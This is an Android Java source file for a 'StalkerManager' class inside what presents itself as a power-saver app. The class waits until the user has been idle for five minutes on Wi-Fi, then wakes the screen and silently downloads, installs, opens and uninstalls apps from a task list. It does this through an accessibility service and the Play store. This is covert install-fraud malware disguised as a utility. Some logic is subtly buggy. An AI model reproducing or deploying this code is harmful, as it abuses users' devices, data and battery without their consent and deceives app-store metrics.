package com.luna.powersaver.gp.manager;

import android.content.Context;
import android.os.Handler;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.entity.JsonAppInfo;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.http.bean.DownloadInfo;
import com.luna.powersaver.gp.service.NBAccessibilityService;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppUtil;
import com.luna.powersaver.gp.utils.DBUtil;
import com.luna.powersaver.gp.utils.FileUtil;
import com.luna.powersaver.gp.utils.JsonUtil;
import com.luna.powersaver.gp.utils.NetworkUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import static com.luna.powersaver.gp.service.NBAccessibilityService.sCurrentWorkType;

/**
 * 为了操作方便，暂时实行同一时间一个任务 <br />
 * 此处工作基本都在线程执行 <br />
 * Created by zsigui on 17-1-18.
 */

public class StalkerManager implements DownloadInfo.DownloadListener {

    private static StalkerManager sInstance;

    public static StalkerManager get() {
        if (sInstance == null) {
            sInstance = new StalkerManager();
        }
        return sInstance;
    }

    private static final String FILE_TOTAL_NAME = "all";
    private static final String FILE_KEY_NAME = "k";
    /**
     * 默认监测用户无操作间隔，5分钟，单位 ms
     */
    private static final int DEFAULT_SPY_DIFF_TIME = 5 * 60 * 1000;
    /**
     * 默认至少需要打开的时间，单位 s
     */
    private static final int DEFAULT_OPEN_TIME = 5 * 60;
    /**
     * 当前正在执行的任务
     */
    public JsonAppInfo pCurrentWorkInfo;
    // 全部任务列表
    private HashMap<String, JsonAppInfo> mTotalMap = null;
    private ArrayList<JsonAppInfo> mWaitingList = null;

    /**
     * 移除废除的任务，建议线程中执行
     */
    public void removeOldTask(String oldpkgs) {
        if (TextUtils.isEmpty(oldpkgs)) {
            return;
        }
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        String[] oldpkgArr = oldpkgs.split("|");
        JsonAppInfo tmp;
        for (String pkg : oldpkgArr) {
            if (TextUtils.isEmpty(pkg))
                continue;

            if (pCurrentWorkInfo != null && pCurrentWorkInfo.pkg.equals(pkg)) {
                // 当前任务需要废除
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DISCARD;
                pCurrentWorkInfo = null;
                DBUtil.setWorkingInfo(null);
            }
            // totalMap 跟 finishedSet 不废除，保留记录？
            for (int i = mWaitingList.size(); i > 0; i--) {
                tmp = mWaitingList.get(i);
                if (tmp == null) {
                    mWaitingList.remove(i);
                } else if (pkg.equals(tmp.pkg)) {
                    mWaitingList.remove(i);
                    mTotalMap.remove(pkg);
                }
            }
        }
    }

    /**
     * 判断并添加新增的任务，建议线程中执行
     */
    public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务： " + newpkgs);
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        JsonAppInfo old;
        for (JsonAppInfo info : newpkgs) {
            AppDebugLog.d(AppDebugLog.TAG_STALKER, "待判断第一个礼包：" + info);
            if (info == null)
                continue;
            old = mTotalMap.get(info.pkg);
            if (old == null) {
                mWaitingList.add(info);
                mTotalMap.put(info.pkg, info);
            } else {
                if (old.execState != JsonAppInfo.EXC_STATE.FINISHED
                        || (old.endtime < info.starttime)) {
                    // 任务没完成或者需要重置
                    old.starttime = info.starttime;
                    old.endtime = info.endtime;
                    old.task = info.task;
                    if (old.execState != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD) {
                        mWaitingList.add(old);
                    }
                    old.execState = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
                }
            }
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加结果： " + mTotalMap + "\n " + mWaitingList);
    }

    private Handler mHandler = new Handler();
    private Runnable run = new Runnable() {
        @Override
        public void run() {
            if (mTotalMap == null) {
                restoreCurrentTask();
            }
            if (NetworkUtil.isWifiConnected(StaticConst.sContext)) {
                NBAccessibilityService.sIsInWork = true;
                screenWakeup();
                doStart();
            } else {
                stopSpyWork();
            }
        }
    };

    /**
     * 开启监视弹窗，然后执行任务的过程
     */
    public void startSpyWork() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
        mHandler.postDelayed(run, 10 * 1000);
    }


    public void stopSpyWork() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "取消执行监视任务!");
        screenLock();
        mHandler.removeCallbacksAndMessages(run);
        mTotalMap = null;
        mWaitingList = null;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.CLEAR;
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
    }

    /**
     * 实际开始执行任务，
     */
    public void doStart() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doStart执行!");
        if (!NBAccessibilityService.sIsInWork) {
            return;
        }
        NBAccessibilityService.sRetryTime = 0;
        if (pCurrentWorkInfo != null) {
            // 确保一致
            pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
            if (pCurrentWorkInfo != null) {
                switch (pCurrentWorkInfo.execState) {
                    case JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD:
                    case JsonAppInfo.EXC_STATE.DOWNLOADING:
                    case JsonAppInfo.EXC_STATE.DOWNLOADED:
                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            // 已经安装了，转换状态
                            doContinueAfterInstalled();
                            return;
                        }
                        break;
                    case JsonAppInfo.EXC_STATE.INSTALLED:
                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            doContinueAfterInstalled();
                            return;
                        }
                        break;
                    case JsonAppInfo.EXC_STATE.OPENED:
                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            doContinueAfterOpened();
                            return;
                        }
                        break;
                    case JsonAppInfo.EXC_STATE.FINISHED:
                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                            pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                            pCurrentWorkInfo = null;
                        }
                        break;
                }
            }
        }

        if (pCurrentWorkInfo == null) {
            // 处理 pCurrentWorkInfo
            int i = mWaitingList.size() - 1;
            JsonAppInfo info = null;
            if (i > -1) {
                long curTime = System.currentTimeMillis() / 1000;

                info = mWaitingList.get(i);
                while (i > -1) {
                    if (info == null) {
                        mWaitingList.remove(i);
                    } else if (curTime >= info.endtime) {
                        // 已经超时，任务废弃
                        mWaitingList.remove(i);
                        info.execState = JsonAppInfo.EXC_STATE.DISCARD;
                    } else if (curTime > info.starttime) {
                        // 还没到可以执行的时候，跳过
                        break;
                    }
                    info = mWaitingList.get(--i);
                }
            }
            if (info == null) {
                // 没有任务或者没有合适的任务，此次执行提前结束
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有任务或者没有合适的任务，此次执行提前结束");
                stopSpyWork();
                return;
            }

            pCurrentWorkInfo = info;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行当前任务，pCurrentWorkInfo = " + pCurrentWorkInfo.pkg);

        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADING;
        NBAccessibilityService.sCurrentWorkState = 0;
        if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            // 开始下载
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setDownloadUrl(pCurrentWorkInfo.url);
            downloadInfo.setDestUrl(pCurrentWorkInfo.url);
            downloadInfo.setPackageName(pCurrentWorkInfo.pkg);
            DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
            // 需要等下载完之后回调
            sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        } else if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
            sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
            AppUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg);
        }
    }

    /**
     * 卸载完成后执行下一个任务
     */
    public void doContinueAfterUninstall() {
        // 卸载之后，则开始执行下一个任务
        NBAccessibilityService.sCurrentWorkState = 0;
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
            pCurrentWorkInfo = null;
        }
        doStart();
    }

    /**
     * 当APP检测已经安装，执行该步骤
     */
    public void doContinueAfterInstalled() {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.INSTALLED;
        NBAccessibilityService.sCurrentWorkState = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                }
                // 安装后不打开立即卸载
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    // 开启后台计时服务
                    ClockManager.get().startOpenRecordAlarm(StaticConst.sContext);
                }
                break;
        }
    }

    /**
     * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
     */
    public void doContinueAfterOpened() {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.OPENED;
        NBAccessibilityService.sCurrentWorkState = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 一般该状态到不了这里
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                pCurrentWorkInfo = null;
                doStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 一般该状态到不了这里
                sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    pCurrentWorkInfo = null;
                    doStart();
                }
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
                if (isFinishedOpen()) {
                    pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                    pCurrentWorkInfo = null;
                    doStart();
                } else {
                    sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                    judgeOpen();
                }
                break;
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (isFinishedOpen()) {
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                } else {
                    judgeOpen();
                }
                break;
        }
    }

    /**
     * 判断开启应用，并进行打开计时
     */
    private void judgeOpen() {
        if (NBAccessibilityService.sIsInWork) {
            if (!AppUtil.isPkgForeground(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
                // 开启后台计时服务
            }
        }
    }

    /**
     * 下载完成后处理，由于通过GP会直接跳转安装完成，则GP下载该步是忽略的
     *
     * @param info
     */
    public void doContinueAfterDownloaded(DownloadInfo info) {
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        NBAccessibilityService.sCurrentWorkState = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 删除包，然后不做其他操作
                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 安装后不打开立即卸载
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.install(StaticConst.sContext,
                            DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                }
                sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                break;
        }
    }

    public void doContinueAfterSearch() {
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
        NBAccessibilityService.sCurrentWorkState = 0;
    }

    @Override
    public void onProgressUpdate(DownloadInfo info, int elapsedTime) {

    }

    @Override
    public void onFinishDownload(DownloadInfo info) {
        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADED;
        doContinueAfterDownloaded(info);
    }

    @Override
    public void onFailDownload(DownloadInfo info, String err) {
        // 下载失败，重置或者废弃？
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "下载失败: " + info.getPackageName() + ", url = "
                + info.getDownloadUrl() + ", err = " + err);
    }

    @Nullable
    private File getOrMkStoreDir() {
        File storeDir = FileUtil.getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
        if (!storeDir.exists() || !storeDir.isDirectory()) {
            boolean isSuccess = storeDir.mkdirs();
            if (!isSuccess) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "创建文件夹失败: " + storeDir.getAbsolutePath());
                return null;
            }
        }
        return storeDir;
    }

    /**
     * 保存任务状态，建议在线程中执行
     */
    public void saveCurrentTask() {
        if (mTotalMap == null)
            return;

        File storeDir = getOrMkStoreDir();
        if (storeDir == null) return;
        truncateTotalMap();
        String json = JsonUtil.convertJsonAppInfoMapToJson(mTotalMap);
        FileUtil.writeData(new File(storeDir, FILE_TOTAL_NAME), json);
        json = JsonUtil.convertJsonAppInfoToJson(pCurrentWorkInfo);
        FileUtil.writeData(new File(storeDir, FILE_KEY_NAME), json);
    }

    /**
     * 提取任务状态，建议在线程中执行
     */
    public void restoreCurrentTask() {
        File tmpFile = getOrMkStoreDir();
        if (tmpFile != null) {
            tmpFile = new File(tmpFile, FILE_TOTAL_NAME);
            String json;
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                mTotalMap = JsonUtil.convertJsonStringToJsonAppInfoMap(json);
            }
            tmpFile = new File(tmpFile, FILE_KEY_NAME);
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                pCurrentWorkInfo = JsonUtil.convertJsonToJsonAppInfo(json);
            }
        }
        mTotalMap = (mTotalMap == null ? new HashMap<String, JsonAppInfo>() : mTotalMap);
        if (mWaitingList == null) {
            mWaitingList = new ArrayList<>();
        } else {
            mWaitingList.clear();
        }
        if (mTotalMap != null) {
            if (pCurrentWorkInfo != null) {
                pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
            }
            for (JsonAppInfo info : mTotalMap.values()) {
                if (info.execState != JsonAppInfo.EXC_STATE.FINISHED
                        && info.execState != JsonAppInfo.EXC_STATE.DISCARD) {
                    mWaitingList.add(info);
                }
            }
        }
    }


    /**
     * 缩减数据，将废弃或者已经完成的过期的数据删除
     */
    private void truncateTotalMap() {
        int size = mTotalMap.size();
        if (size > 200) {
            // 尽量削减，最多一半
            Iterator<JsonAppInfo> it = mTotalMap.values().iterator();
            JsonAppInfo tmp;
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.DISCARD) {
                    it.remove();
                    size--;
                }
                if (size <= 100) {
                    break;
                }
            }
            if (size > 150) {
                it = mTotalMap.values().iterator();
                long curTime = System.currentTimeMillis();
                while (it.hasNext()) {
                    tmp = it.next();
                    if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.FINISHED
                            && tmp.endtime < curTime) {
                        it.remove();
                        size--;
                    }
                    if (size <= 100) {
                        break;
                    }
                }
            }
        }
    }

    public boolean isFinishedOpen() {
        return pCurrentWorkInfo != null && pCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME;
    }

    public void judgeClearList() {
        if (!NBAccessibilityService.sIsInWork) {
            StalkerManager.get().saveCurrentTask();
            pCurrentWorkInfo = null;
            mTotalMap = null;
            mWaitingList = null;
        }
    }


    private PowerManager.WakeLock mWakeLock;

    public void screenWakeup() {
        if (mWakeLock == null) {
            PowerManager pm = (PowerManager) StaticConst.sContext.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "test");
            mWakeLock.acquire();
        }
    }

    public void screenLock() {
        if (mWakeLock != null) {
            mWakeLock.release();
            mWakeLock = null;
        }
    }

}
